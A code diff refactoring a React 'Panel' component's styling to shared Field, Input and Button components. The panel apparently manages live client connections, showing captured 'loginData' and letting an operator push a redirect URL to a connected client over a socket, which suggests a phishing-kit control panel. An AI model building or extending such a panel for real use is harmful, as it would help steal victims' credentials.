                                                                                                                 className="px-3 py-1.5 text-xs border border-red-500 text-red-500 bg-red-500/10 hover:bg-red-500/20 font-medium rounded flex items-center gap-1.5"
                                                                                                             >
                                                                                                                 <XCircle className="w-3.5 h-3.5" /> Deny
@@ -1299,17 +1372,17 @@ export default function Panel() {
                                                                                         {/* Redirect to URL - only when we have login data */}
                                                                                         {selectedConnection.loginData && (
                                                                                             <>
-                                                                                                <div>
-                                                                                                    <Label className="text-gray-500 text-xs mb-1.5 block">Redirect to URL</Label>
+                                                                                                <Field className="w-full">
+                                                                                                    <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Redirect to URL</FieldLabel>
                                                                                                     <div className="flex gap-2">
-                                                                                                        <input
+                                                                                                        <Input
                                                                                                             type="url"
                                                                                                             placeholder="https://example.com"
                                                                                                             value={redirectUrl}
                                                                                                             onChange={(e) => setRedirectUrl(e.target.value)}
-                                                                                                            className="flex-1 px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 placeholder-gray-500 focus:outline-none input-coolify"
+                                                                                                            className="flex-1 bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 placeholder-gray-500 input-coolify"
                                                                                                         />
-                                                                                                        <button
+                                                                                                        <Button
                                                                                                             onClick={() => {
                                                                                                                 if (redirectUrl.trim()) {
                                                                                                                     socket.emit('redirect', { socketId: selectedConnection.id, url: redirectUrl });
@@ -1318,16 +1391,17 @@ export default function Panel() {
                                                                                                                     setTimeout(() => setRedirectUrlSent(false), 2000);
                                                                                                                 }
                                                                                                             }}
-                                                                                                            className="px-4 py-2 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded text-sm"
+                                                                                                            variant="amber"
                                                                                                         >
                                                                                                             {redirectUrlSent ? 'Sent' : 'Send'}
-                                                                                                        </button>
+                                                                                                        </Button>
                                                                                                     </div>
-                                                                                                </div>
+                                                                                                </Field>
                                                                                                 {selectedConnection.lastRedirect && (
-                                                                                                    <div className="p-3 bg-blue-500/10 border border-blue-500/20 rounded text-xs text-blue-400">
-                                                                                                        Last redirect: {selectedConnection.lastRedirect.url}
-                                                                                                    </div>
+                                                                                                    <Field className="w-full">
+                                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Last redirect</FieldLabel>
+                                                                                                        <Input readOnly value={selectedConnection.lastRedirect.url} className="bg-[#51A2FF]/10 border-[#51A2FF]/20 text-[#51A2FF] text-xs" />
+                                                                                                    </Field>
                                                                                                 )}
                                                                                             </>
                                                                                         )}
@@ -1347,19 +1421,14 @@ export default function Panel() {
 
                                                                                 {sectionsOpen.timing && (
                                                                                     <div className="grid grid-cols-2 gap-3">
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Connected At</Label>
-                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                            {formatFullDate(selectedConnection.connectedAt)}
-                                                                                        </div>
-                                                                                    </div>
-
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Duration</Label>
-                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                            {formatTimeAgo(selectedConnection.connectedAt)}
-                                                                                        </div>
-                                                                                    </div>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Connected At</FieldLabel>
+                                                                                        <Input readOnly value={formatFullDate(selectedConnection.connectedAt)} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                    </Field>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Duration</FieldLabel>
+                                                                                        <Input readOnly value={formatTimeAgo(selectedConnection.connectedAt)} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                    </Field>
                                                                                 </div>
                                                                                 )}
                                                                             </div>
@@ -1367,7 +1436,7 @@ export default function Panel() {
 
                                                                         <SheetFooter className="mt-6 pt-6 border-t border-[#2C2C2E]">
                                                                             <div className="flex gap-3 w-full">
-                                                                                <button
+                                                                                <Button
                                                                                     onClick={() => {
                                                                                         const data = {
                                                                                             ...selectedConnection,
@@ -1375,15 +1444,16 @@ export default function Panel() {
                                                                                         };
                                                                                         copyToClipboard(JSON.stringify(data, null, 2));
                                                                                     }}
-                                                                                    className="flex-1 px-4 py-2 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded text-sm flex items-center justify-center gap-2"
+                                                                                    variant="amber"
+                                                                                    className="flex-1"
                                                                                 >
                                                                                     <Copy className="w-4 h-4" />
                                                                                     Copy JSON
-                                                                                </button>
+                                                                                </Button>
                                                                                 <SheetClose asChild>
-                                                                                    <button className="flex-1 px-4 py-2 bg-[#28282A] hover:bg-[#2C2C2E] text-gray-300 font-medium rounded text-sm">
+                                                                                    <Button variant="muted" className="flex-1">
                                                                                         Close
-                                                                                    </button>
+                                                                                    </Button>
                                                                                 </SheetClose>
                                                                             </div>
                                                                         </SheetFooter>
